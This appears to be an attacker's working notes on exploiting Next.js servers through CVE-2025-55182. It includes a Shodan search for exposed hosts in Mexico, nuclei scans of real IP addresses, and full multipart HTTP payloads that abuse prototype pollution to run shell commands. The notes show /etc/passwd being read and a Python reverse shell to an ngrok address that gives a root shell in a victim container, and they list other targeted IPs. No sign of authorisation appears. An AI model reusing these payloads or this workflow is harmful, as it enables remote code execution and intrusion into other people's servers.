```
shodan:
"x-nextjs-cache: HIT"  "Next-Router-State-Tree" country:mx port:3000
```



```
	http://200.33.143.51:3000/
	
	
nuclei -target http://200.33.143.51:3000/ -t cves/2025/CVE-2025-55182.yaml

dig -x 200.33.143.51 +short
customer-200-33-143-51.uninet.net.mx



POST / HTTP/1.1
Host:  localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 753

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('cat /etc/passwd',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--


HTTP/1.1 500 Internal Server Error
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
x-nextjs-cache: HIT
x-nextjs-prerender: 1
X-Powered-By: Next.js
Content-Type: text/x-component
Date: Wed, 10 Dec 2025 15:19:22 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 961

0:{"a":"$@1","f":"","b":"gxSQnhli7WH8Yvc2nauhq"}
1:E{"digest":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nnode:x:1000:1000::/home/node:/bin/bash"}





POST / HTTP/1.1
Host:  localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 791

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('python3 -c \\'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"5.tcp.eu.ngrok.io\",10210));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")\\'',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--





ngrok                                                                                                                                                                                                          (Ctrl+C to quit)

🤫 Put your secrets in vaults and (re)use them to transform traffic: https://ngrok.com/r/secrets

Session Status                online
Account                       Hack (Plan: Free)
Update                        update available (version 3.34.0, Ctrl-U to update)
Version                       3.33.0
Region                        Europe (eu)
Latency                       187ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://5.tcp.eu.ngrok.io:10210 -> localhost:4444

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       1       0.00    0.00    0.00    0.00




❯ nc -l 4444
ERROR: ld.so: object '/dev/shm/libsystem.so' from /etc/ld.so.preload cannot be preloaded (invalid ELF header): ignored.
root@b2de27469c06:/frontend# ls
ls
ERROR: ld.so: object '/dev/shm/libsystem.so' from /etc/ld.so.preload cannot be preloaded (invalid ELF header): ignored.
5.sh	       next.config.mjs	  package.json	      src
agent.sh       node_modules	  postcss.config.mjs  tailwind.config.ts
next-env.d.ts  package-lock.json  public	      tsconfig.json
root@b2de27469c06:/frontend#
```


## 2
5.189.176.239:3000
id, not shell


## 3
193.122.145.107
id, not shell

## 4

```

- 216.238.92.35

dig -x 216.238.92.35 +short
216-238-92-35.constant.com.




```